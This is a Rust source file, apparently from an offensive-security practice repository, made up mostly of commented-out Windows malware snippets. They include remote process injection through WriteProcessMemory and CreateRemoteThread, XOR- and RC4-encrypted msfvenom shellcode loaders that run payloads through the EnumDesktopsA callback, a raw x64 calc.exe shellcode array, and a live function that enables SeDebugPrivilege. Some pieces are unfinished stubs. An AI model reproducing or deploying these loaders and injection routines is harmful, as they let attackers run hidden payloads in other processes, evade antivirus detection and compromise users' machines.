//         let res = WriteProcessMemory(handle, address,shellcode.as_ptr().cast(), size,null_mut());
//         if res == FALSE{
//             panic!("[-] Failed to Write Process to Memory : {}",GetLastError());
//         }
//         let mut old = PAGE_READWRITE;
//         let res = VirtualProtectEx(handle, address, size, PAGE_EXECUTE, &mut old);
//         if res == FALSE {
//             panic!("[-]VirtualProtectEx failed: {}!", GetLastError());
//         }

//         let func = transmute(address);
//         let thread = CreateRemoteThread(handle,null_mut(), 0, func, null_mut(),0, null_mut());
        
//         if thread == null_mut(){
//             panic!("[-] Failed to create Remote Process : {}",GetLastError());
//         }    
//         WaitForSingleObject(thread,WAIT_FAILED);

//         let clean = CloseHandle(handle);
//         if clean == FALSE{
//             println!("[-] Unable to close the Handle!");

//         // Just an Info : you dont need to free up space . Rust will automatically take care when goes out of scope ! . If you do so you can do it on your own !

//         }
//     }
//     println!("[+] Remote Code Executed Successfully !");
//     Ok(())
// }

// fn xor_decrypt(data: &mut [u8], key: &[u8]){
//     let mut j = 0;
//     for i in 0..data.len(){
//         if j == key.len() -1 {
//             j = 0;
//         }
//         data[i] ^= key[j];
//         j += 1;
//     }
// }



// use std::ptr::null_mut;

// use winapi::um::{memoryapi::VirtualAlloc, winnt::{RtlMoveMemory, MEM_COMMIT, PAGE_EXECUTE_READWRITE}, winuser::{EnumDesktopsA, GetProcessWindowStation}};
// fn main(){

//     // calc shellcode generated from msfvenom !
//     let mut shellcode = [0x3a, 0x34, 0x38, 0x31, 0x00, 0x1a, 0x33, 0x1a, 0x12, 0x16, 0x1d, 0x1a, 0x25, 0x26, 0x3a, 0x51, 0xa5, 0x1b, 0x3b, 0xf2, 0xbb, 0x30, 0x0a, 0xf6, 0x9e, 
//     0xc8, 0x03, 0xf6, 0x9e, 0xc9, 0x2a, 0xc8, 0x06, 0xb2, 0xc0, 0x13, 0xf9, 0xa0, 0x8c, 0xc2, 0xb3, 0x1c, 0xd3, 0x8a, 0xb8, 0x1d, 0xfb, 0x83, 0xb1, 0xdf, 0xa6, 0x68, 0x14, 0xca, 0xbb, 0xba, 0xa9, 0x29, 0x80, 0x88, 0x28, 0xcc, 0xa9, 0x0d, 0x27, 0x8a, 0xa2, 0xf9, 0xc4, 0xdd, 0xe8, 0xc0, 0x42, 0x30, 0xda, 0xab, 0xb1, 0xf2, 0xae, 0x4b, 0x4e, 0x80, 0x13, 0xf4, 0xc3, 0x4b, 0x5d, 0x43, 0x1d, 0xf5, 0x40, 0x78, 0xa1, 0xe3, 0x9b, 0x8a, 0x98, 0x0f];  
    
//     let secrect_key = "iamafuckingnerd";

//     xor_decrypt(&mut shellcode, secrect_key.as_bytes());
//     unsafe{
//         let alloc = VirtualAlloc(
//             null_mut(), 
//             shellcode.len(),
//             MEM_COMMIT,
//             PAGE_EXECUTE_READWRITE
//         );
        
//         RtlMoveMemory(alloc, shellcode.as_ptr() as *const _ , shellcode.len());
        
//         EnumDesktopsA(GetProcessWindowStation(), std::mem::transmute(alloc) , 0);
//     }
// }

// use std::ptr;
// use std::ptr::null_mut;

// use winapi::shared::minwindef::LPVOID;
// use winapi::um::wincrypt::{CryptStringToBinaryA, CRYPT_STRING_BASE64};
// use winapi::um::winuser::{EnumDesktopsA, GetProcessWindowStation};
// use winapi::um::winnt::{PAGE_EXECUTE_READWRITE, MEM_COMMIT};
// use winapi::um::memoryapi::VirtualAlloc;

// pub fn b64decode(src: &[u8], dst: &mut [u8]) -> usize {
//     let mut out_len: usize = dst.len();
//     let f_ret = unsafe {
//         CryptStringToBinaryA(
//             src.as_ptr() as *const i8,
//             src.len() as u32,
//             CRYPT_STRING_BASE64,
//             dst.as_mut_ptr(),
//             &mut out_len as *mut usize as *mut u32,
//             ptr::null_mut(),
//             ptr::null_mut(),
//         )
//     };
//     if f_ret == 0 {
//         out_len = 0;
//     }
//     out_len
// }

// fn swap(a: &mut u8, b: &mut u8){
//     let tmp = *a;
//     *a = *b;
//     *b = tmp;
// }

// fn ksa(s: &mut [u8], key: &[u8]){
//     let mut j: usize = 0;
//     for i in 0..256{
//         s[i] = i as u8;
//     }
//     for i in 0..256{
//         j = (j + s[i] as usize + key[i % key.len()] as usize) % 256;
//         swap(&mut s[i].clone(), &mut s[j]);
//     }
// }

// fn prga(s: &mut [u8], message_l: usize) -> Vec<u8> {
//     let mut i = 0;
//     let mut j = 0;
//     let mut keystream: Vec<u8> = Vec::with_capacity(message_l);
//     for _ in 0..message_l {
//         i = (i + 1) % 256;
//         j = (j + s[i] as usize) % 256;
//         let mut s_clone = s.to_vec(); // Clone s to avoid multiple mutable borrows
//         swap(&mut s_clone[i].clone(), &mut s_clone[j]);
//         keystream.push(s_clone[(s_clone[i] as usize + s_clone[j] as usize) % 256]);
//     }
//     keystream
// }


// fn rc4(plaintext: &[u8], key: &[u8]) -> Vec<u8> {
//     let mut ciphertext: Vec<u8> = vec![0; plaintext.len()];
//     let mut s: [u8; 256] = [0; 256];
//     ksa(&mut s, key);
//     let keystream = prga(&mut s, plaintext.len());
//     for i in 0..plaintext.len() {
//         ciphertext[i] = plaintext[i] ^ keystream[i];
//     }
//     ciphertext
// }

// #[allow(non_snake_case)]
// unsafe extern "system" fn enum_desktops_callback(
//     lpDesktop: *mut i8,
//     lParam: isize,
// ) -> i32 {
//     0 // Dummy implementation, adjust as needed
// }


// fn main(){
//     let plaintext = b"This is an test";
//     let key = b"hello mf";
//     let ciphertext = rc4(plaintext, key);
//     let payload: &[u8] = &[];
//     let decode = rc4(payload,key);
//     println!("[+] CIPHER TEXT: {:#?}",ciphertext);
//     let mut decode_bytes = vec![0;512];
//     let decode_len = b64decode(&decode, &mut decode_bytes);

//     let alloc:LPVOID = unsafe{
//         VirtualAlloc(null_mut(), decode_len, MEM_COMMIT , PAGE_EXECUTE_READWRITE)
//     };

//     let decode_payload = &decode_bytes[..decode_len];
//     unsafe{
//         ptr::copy(decode_payload.as_ptr(), alloc as *mut u8, decode_len);
//         EnumDesktopsA(GetProcessWindowStation(), Some(enum_desktops_callback), null_mut::<i32>() as isize);
//     }
// }

// use std::ptr;
// use winapi::shared::ntdef::NULL;
// use winapi::{
//     shared::{bcrypt::NTSTATUS, minwindef::DWORD, ntdef::{LPCSTR, PVOID}}, 
//     um::libloaderapi::{GetProcAddress, LoadLibraryA}};


// #[repr(C)]
// #[allow(non_snake_case)]
// struct USTRING{
//     Length: u32,
//     MaximumLength: u32,
//     Buffer: PVOID,
// }


// // ntstatus is nothing but long -> c_long -> i32
// type FNSYSTEMFUNCTION032 = extern "system" fn(*mut USTRING, *mut USTRING) -> NTSTATUS;

// fn rc4_encryption_vi_system_func032(p_rc4_key: *mut u8, p_payload_data: *mut u8, dw_rc4_key_size: DWORD, s_payload_size: DWORD) -> bool {
//     // let mut status: NTSTATUS = 0;
//     let mut key = USTRING {
//         Buffer: p_rc4_key as PVOID,
//         Length: dw_rc4_key_size,
//         MaximumLength: dw_rc4_key_size, 
//     };

//     let mut img = USTRING {
//         Buffer: p_payload_data as PVOID,
//         Length: s_payload_size,
//         MaximumLength: s_payload_size,
//     };

// //  SystemFunction032 is exported from Advapi32.dll, use LoadLibraryA to load Advapi32.dll into the process, 
//     let advapi32_handle = unsafe { LoadLibraryA(b"Advapi32\0".as_ptr() as LPCSTR) };

//     if advapi32_handle.is_null(){
//         println!("[-] Failed to Load Advapi32.dll");
//         return false;
//     }

//     let systemfunction_032: FNSYSTEMFUNCTION032 = unsafe{
//         let func_ptr = GetProcAddress(advapi32_handle, b"SystemFunction032\0".as_ptr() as LPCSTR);
//         if func_ptr.is_null(){
//             println!("[-] Failed to get address of SystemFunction032");
//             return false;
//         }
//         std::mem::transmute(func_ptr)
//     };
//     if {systemfunction_032(&mut img as *mut USTRING, &mut key as *mut USTRING)} != 0x0 {
//         println!("[-] SystemFunction32 FAILED");
//         return false;
//     }
//     true
// }

// fn print_hex_data(name: &str, data: *const u8, size: usize){
//     println!("ctype hex_Data {}[] = {{",name);
//     for i in 0..size{
//         if i % 16 == 0{
//             print!("\n\t");
//         }
//         if i < size -1 {
//             print!("0x{:02X}, ", unsafe { *data.add(i)});
//         }else{
//             print!("0x{:02X} ", unsafe { *data.add(i)}); 
//         }
//     }
//     println!("}};\n\n");
// }

// fn main(){

//     // calc shellcode generated from msfvenom !
//     let enc_shellcode = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,
//     0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
//     0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
//     0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
//     0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
//     0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
//     0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
//     0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
//     0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
//     0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
//     0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
//     0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
//     0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
//     0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
//     0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
//     0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
//     0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
//     0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
//     0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,
//     0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,
//     0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
//     0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
//     0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
//     0x63,0x2e,0x65,0x78,0x65,0x00];

//     // enter the key using some hex CString format ! 
//     let key = [
//         0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
//     ];

//     println!("[+] Shellcode: {:?}", &enc_shellcode as *const _);
//     println!("[#] Press <Enter to Decrypt ...");

//     let _ = std::io::stdin().read_line(&mut String::new());

//     if !rc4_encryption_vi_system_func032(
//         key.as_ptr() as *mut _, 
//         enc_shellcode.as_ptr() as *mut u8,
//         key.len() as DWORD,
//         enc_shellcode.len() as DWORD){
//         return;
//     }
    
//     print_hex_data("Shellcode", enc_shellcode.as_ptr(), enc_shellcode.len());
//     println!("[#] Press <Enter> To Quit ...");
    
//     let _ = std::io::stdin().read_line(&mut String::new());
// }

// use std::{fmt::Error, mem, ptr::null_mut};

// use winapi::um::{handleapi::CloseHandle, processthreadsapi::{GetCurrentProcess, OpenProcessToken}, winbase::LookupPrivilegeValueA, winnt::{LUID, SE_DEBUG_NAME, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, TOKEN_QUERY}};
// use windows::Win32::Security::AdjustTokenPrivileges;

// fn set_debug_token() -> Result<(), Error>{
//     unsafe{
//         let mut h_token = null_mut();
//         if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut h_token) != 0 {
//             let mut luid: LUID = mem::zeroed();
//             if LookupPrivilegeValueA(null_mut(), SE_DEBUG_NAME.as_ptr() as *const i8, &mut luid) != 0{
//                 let mut token_privilage:TOKEN_PRIVILEGES = mem::zeroed();
//                 token_privilage.PrivilegeCount = 1;
//                 token_privilage.Privileges[0].Luid = luid;
//                 token_privilage.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
//                 if AdjustTokenPrivileges(std::mem::transmute(h_token), 0, &mut token_privilage, mem::size_of::<TOKEN_PRIVILEGES>() as u32, Some(null_mut()), Some(null_mut())) != 0{
//                     CloseHandle(h_token);
//                     return Ok(());
//                 }
//             }
//             CloseHandle(h_token);
//         }
//         Err(Error::last_os_error())
//     }
// }

// fn check_debug_privs() -> Result<bool, Error>{
//     unsafe{

//     }
// }

// fn main(){

// }


// actual implementation ! 

use std::{mem,ptr::null_mut};

use winapi::um::{handleapi::CloseHandle, processthreadsapi::{GetCurrentProcess, OpenProcessToken}, winbase::LookupPrivilegeValueA, winnt::{LUID_AND_ATTRIBUTES, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, TOKEN_QUERY}};
use windows::Win32::Security::AdjustTokenPrivileges;

fn set_debug_token() -> bool{
    unsafe{
        let mut token= null_mut();
        let mut token_privilages = TOKEN_PRIVILEGES{
            PrivilegeCount: 1,
            Privileges: [LUID_AND_ATTRIBUTES {Luid: mem::zeroed(), Attributes: 0}; 1],
        };
    
        if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut token) != 0{
            if LookupPrivilegeValueA(null_mut(),b"SeDebugPrivilege\0".as_ptr() as *const i8, &mut token_privilages.Privileges[0].Luid) != 0{
                token_privilages.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                
                if AdjustTokenPrivileges(token, 0, &mut token_privilages, mem::size_of_val(&token_privilages) as u32, None, None) !=0{
                    CloseHandle(token);
                    return true;
                }
            }
            CloseHandle(token);
        }
    }
    false
}

fn main(){
    
}
